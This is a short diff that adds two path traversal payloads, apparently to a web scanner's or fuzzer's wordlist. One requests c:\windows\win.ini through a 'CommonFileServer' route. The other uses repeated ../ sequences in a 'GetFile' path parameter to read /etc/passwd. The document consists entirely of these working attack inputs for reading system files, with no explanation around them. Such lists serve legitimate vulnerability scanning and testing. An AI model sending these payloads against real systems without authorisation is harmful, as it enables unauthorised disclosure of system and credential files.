@@ -1,0 +1,2 @@
+/CommonFileServer/c%3A%2Fwindows%2Fwin.ini
+/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
